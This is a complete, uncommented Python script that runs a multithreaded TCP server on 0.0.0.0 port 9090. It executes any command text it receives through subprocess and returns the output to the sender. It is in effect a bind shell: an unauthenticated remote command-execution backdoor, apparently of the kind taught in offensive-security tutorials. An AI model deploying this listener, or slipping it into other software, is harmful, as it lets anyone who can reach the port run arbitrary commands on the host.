import socket
import threading
import subprocess

BIND_IP = '0.0.0.0'
BIND_PORT = 9090

def handle_client(client_socket):
    request = client_socket.recv(1024)
    print("[*] Received:", request)
    try:
        response = subprocess.check_output(request.split(), timeout=5)
    except Exception as e:
        response = e
    client_socket.send(bytes(response))
    client_socket.close()

def bind_server(server, ip, port):
    while True:
        try:
            server.bind((ip, port))
            return ip, port
        except OSError:
            port += 1

def tcp_server():
    server = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
    ip, port = bind_server(server, BIND_IP, BIND_PORT)
    server.listen(5)
    print("[*] Listening on %s:%d" % (ip, port))
    clients = []

    try:
        while True:
            client, addr = server.accept()
            print("[*] Accepted connection from: %s:%d" %(addr[0], addr[1]))
            client_handler = threading.Thread(target=handle_client, args=(client,))
            client_handler.start()
            clients.append(client_handler)
    except KeyboardInterrupt:
        for client in clients:
            try:
                client.join()
            except:
                pass

if __name__ == '__main__':
    tcp_server()